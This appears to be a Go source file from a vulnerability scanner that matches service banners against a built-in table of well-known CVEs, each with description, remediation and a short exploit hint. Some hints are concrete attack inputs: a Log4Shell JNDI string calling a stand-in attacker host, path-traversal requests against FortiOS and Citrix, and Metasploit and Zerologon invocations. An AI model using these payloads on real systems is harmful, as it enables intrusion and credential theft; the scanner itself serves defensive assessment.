package cve

import (
	"fmt"
	"strings"

	"github.com/apophis-eng/apophis/internal/models"
	"github.com/apophis-eng/apophis/internal/tools/cve/dynamic"
)

type Entry struct {
	CVE         string
	Service     string
	Version     string
	Severity    models.Severity
	CVSS        float64
	Title       string
	Description string
	Exploit     string
	Remediation string
	References  []string
}

var database = []Entry{
	{
		CVE:         "CVE-2016-0777",
		Service:     "ssh",
		Version:     "OpenSSH",
		Severity:    models.SeverityHigh,
		CVSS:        7.8,
		Title:       "OpenSSH 5.4-7.1 client information disclosure (roaming)",
		Description: "The roaming feature in sshd in OpenSSH 5.4 through 7.1 is vulnerable to information disclosure that allows remote malicious servers to obtain sensitive information by reading uninitialized heap memory.",
		Exploit:     "Connect to a malicious SSH server which exploits client heap memory via roaming protocol.",
		Remediation: "Upgrade OpenSSH to 7.1p2+; disable roaming: set 'UseRoaming no' in ssh_config.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2016-0777"},
	},
	{
		CVE:         "CVE-2018-15473",
		Service:     "ssh",
		Version:     "OpenSSH",
		Severity:    models.SeverityHigh,
		CVSS:        7.5,
		Title:       "OpenSSH user enumeration (timing attack)",
		Description: "OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user.",
		Exploit:     "Use python3 with paramiko or auxiliary/scanner/ssh/ssh_enumusers.",
		Remediation: "Upgrade to OpenSSH 7.8+ or apply distro patch.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2018-15473"},
	},
	{
		CVE:         "CVE-2017-0144",
		Service:     "smb",
		Version:     "*",
		Severity:    models.SeverityCritical,
		CVSS:        9.3,
		Title:       "SMBv1 Remote Code Execution (EternalBlue)",
		Description: "The SMBv1 server in Microsoft Windows mishandles specially crafted packets, allowing remote code execution.",
		Exploit:     "Use Metasploit module exploit/windows/smb/ms17_010_eternalblue against TCP/445.",
		Remediation: "Disable SMBv1, apply MS17-010 patch, block 445/TCP at perimeter.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-0144"},
	},
	{
		CVE:         "CVE-2019-0708",
		Service:     "rdp",
		Version:     "*",
		Severity:    models.SeverityCritical,
		CVSS:        9.8,
		Title:       "Remote Desktop Services RCE (BlueKeep)",
		Description: "A remote code execution vulnerability in Remote Desktop Services (formerly Terminal Services) when an unauthenticated attacker connects to the target system using RDP.",
		Exploit:     "Use Metasploit module exploit/windows/rdp/cve_2019_0708_bluekeep_rce against TCP/3389.",
		Remediation: "Apply Microsoft security update, disable RDP if not required, require NLA.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-0708"},
	},
	{
		CVE:         "CVE-2021-44228",
		Service:     "*",
		Version:     "log4j",
		Severity:    models.SeverityCritical,
		CVSS:        10.0,
		Title:       "Log4Shell (log4j RCE)",
		Description: "Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints.",
		Exploit:     "Inject string ${jndi:ldap://attacker.com/poc} in any field the application logs.",
		Remediation: "Upgrade to log4j 2.17.1+, remove JndiLookup.class from classpath, set log4j2.formatMsgNoLookups=true.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-44228", "https://logging.apache.org/log4j/2.x/security.html"},
	},
	{
		CVE:         "CVE-2014-0160",
		Service:     "https",
		Version:     "OpenSSL 1.0.1",
		Severity:    models.SeverityCritical,
		CVSS:        9.8,
		Title:       "Heartbleed (OpenSSL information disclosure)",
		Description: "The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, allowing remote attackers to obtain sensitive information.",
		Exploit:     "Use Metasploit auxiliary/scanner/ssl/openssl_heartbleed against TCP/443.",
		Remediation: "Upgrade OpenSSL to 1.0.1g+ or recompile with -DOPENSSL_NO_HEARTBEATS.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2014-0160"},
	},
	{
		CVE:         "CVE-2017-9805",
		Service:     "http",
		Version:     "struts2",
		Severity:    models.SeverityCritical,
		CVSS:        9.8,
		Title:       "Apache Struts2 OGNL Injection (REST plugin)",
		Description: "The REST Plugin in Apache Struts 2 brings in the XStream library which allows remote code execution via XML payloads.",
		Exploit:     "Send crafted XML payload: <map><entry><jdk.nashorn.internal.objects.NativeString>...</NativeString></entry></map>",
		Remediation: "Upgrade Struts to 2.5.13+ or remove REST plugin if unused.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-9805"},
	},
	{
		CVE:         "CVE-2018-13379",
		Service:     "https",
		Version:     "fortios",
		Severity:    models.SeverityCritical,
		CVSS:        9.8,
		Title:       "Fortinet FortiOS SSL VPN path traversal",
		Description: "An Improper Limitation of a Pathname to a Restricted Directory vulnerability in FortiOS SSL VPN web portal may allow an unauthenticated attacker to download FortiOS system files.",
		Exploit:     "GET /remote/fgt_lang?lang=/../../../..//dev/cmdb/sslvpn_websession",
		Remediation: "Upgrade FortiOS to 5.4.13, 5.6.10, 5.8.6, 6.0.5 or later.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2018-13379"},
	},
	{
		CVE:         "CVE-2019-19781",
		Service:     "http",
		Version:     "citrix",
		Severity:    models.SeverityCritical,
		CVSS:        9.8,
		Title:       "Citrix ADC path traversal (Shitrix)",
		Description: "A directory traversal vulnerability in Citrix Application Delivery Controller (ADC) and Citrix Gateway may allow directory listing.",
		Exploit:     "GET /vpn/../vpns/cfg/smb.conf → /vpn/../vpns/portal/scripts/newbm.pl",
		Remediation: "Apply Citrix mitigations then upgrade ADC/Gateway firmware.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-19781"},
	},
	{
		CVE:         "CVE-2020-1472",
		Service:     "smb",
		Version:     "*",
		Severity:    models.SeverityCritical,
		CVSS:        10.0,
		Title:       "Zerologon (Netlogon Elevation of Privilege)",
		Description: "An elevation of privilege vulnerability exists in the Netlogon Remote Protocol for Windows domain controllers, allowing an attacker to compromise the domain.",
		Exploit:     "Use impacket's zerologon script: python3 zerologon.py DC DC$ ip.",
		Remediation: "Apply August 2020 cumulative update; enforce secure RPC for Netlogon.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2020-1472"},
	},
	{
		CVE:         "CVE-2021-26855",
		Service:     "https",
		Version:     "exchange",
		Severity:    models.SeverityCritical,
		CVSS:        9.8,
		Title:       "Microsoft Exchange ProxyLogon SSRF",
		Description: "Server-side request forgery in Exchange allowing authentication bypass and arbitrary file write for RCE.",
		Exploit:     "Use nmap script http-exchange-proxylogon or proxyshell chain.",
		Remediation: "Apply March 2021 cumulative updates, rotate ASP.NET machine keys.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-26855"},
	},
	{
		CVE:         "CVE-2023-23397",
		Service:     "smb",
		Version:     "*",
		Severity:    models.SeverityHigh,
		CVSS:        9.8,
		Title:       "Outlook NTLM credential leak (PidLidReminderFileParameter)",
		Description: "An attacker could craft an Outlook message triggering NTLM authentication to an attacker-controlled SMB server.",
		Exploit:     "Craft .msg with PidLidReminderFileParameter pointing to UNC path to attacker host.",
		Remediation: "Apply March 2023 update, block outbound SMB at firewall.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-23397"},
	},
	{
		CVE:         "CVE-2017-5638",
		Service:     "http",
		Version:     "struts2",
		Severity:    models.SeverityCritical,
		CVSS:        10.0,
		Title:       "Apache Struts2 Content-Type OGNL RCE",
		Description: "The Jakarta Multipart parser in Apache Struts mishandles Content-Type header allowing OGNL injection.",
		Exploit:     "Send Content-Type: %{(#_='multipart/form-data').(OGNL payload)}",
		Remediation: "Upgrade Struts to 2.3.32 / 2.5.10.1 or later.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-5638"},
	},
	{
		CVE:         "CVE-2015-1635",
		Service:     "http",
		Version:     "iis",
		Severity:    models.SeverityCritical,
		CVSS:        10.0,
		Title:       "IIS 6.0 WebDAV ScStoragePathFromUrl RCE",
		Description: "Microsoft IIS 6.0 allows remote attackers to execute arbitrary code via a crafted HTTP PROPFIND request.",
		Exploit:     "Use Metasploit exploit/windows/iis/iis_webdav_scstoragepathfromurl.",
		Remediation: "Disable WebDAV, upgrade to a supported IIS version.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2015-1635"},
	},
}

type Matcher struct {
	Dynamic *dynamic.Store
}

func New() *Matcher { return &Matcher{} }

func (m *Matcher) WithDynamic(d *dynamic.Store) *Matcher {
	m.Dynamic = d
	return m
}

func (m *Matcher) Match(service, version, banner string) []models.Finding {
	results := []models.Finding{}
	for _, entry := range database {
		if !serviceMatches(entry.Service, service) {
			continue
		}
		if !versionMatches(entry.Version, version, banner) {
			continue
		}
		results = append(results, findingFromEntry(entry, service, version, banner))
	}
	if m.Dynamic != nil {
		for _, de := range m.Dynamic.All() {
			if !serviceMatches(de.Service, service) {
				continue
			}
			if !versionMatches(de.Version, version, banner) {
				continue
			}
			results = append(results, findingFromEntry(toEntry(de), service, version, banner))
		}
	}
	return results
}

func findingFromEntry(e Entry, service, version, banner string) models.Finding {
	return models.Finding{
		Title:       e.Title,
		Severity:    e.Severity,
		Category:    "CVE",
		Target:      service,
		Evidence:    fmtEvid(e, service, version, banner),
		Description: e.Description,
		Exploit:     e.Exploit,
		Remediation: e.Remediation,
		References:  e.References,
		CVE:         []string{e.CVE},
		CVSS:        e.CVSS,
	}
}

func toEntry(d dynamic.Entry) Entry {
	return Entry{
		CVE:         d.CVE,
		Service:     d.Service,
		Version:     d.Version,
		Severity:    models.Severity(d.Severity),
		CVSS:        d.CVSS,
		Title:       d.Title,
		Description: d.Description,
		Exploit:     d.Exploit,
		Remediation: d.Remediation,
		References:  d.References,
	}
}

func serviceMatches(want, got string) bool {
	if want == "*" {
		return true
	}
	return strings.EqualFold(want, got) || strings.Contains(strings.ToLower(got), strings.ToLower(want))
}

func versionMatches(want, got, banner string) bool {
	if want == "*" {
		return true
	}
	if got == "" && banner == "" {
		return false
	}
	if got != "" && strings.Contains(strings.ToLower(got), strings.ToLower(want)) {
		return true
	}
	if banner != "" && strings.Contains(strings.ToLower(banner), strings.ToLower(want)) {
		return true
	}
	return false
}

func fmtEvid(e Entry, service, version, banner string) string {
	evid := fmt.Sprintf("Match against %s for service=%s version=%s banner_excerpt=%q", e.CVE, service, version, truncate(banner, 80))
	return evid
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
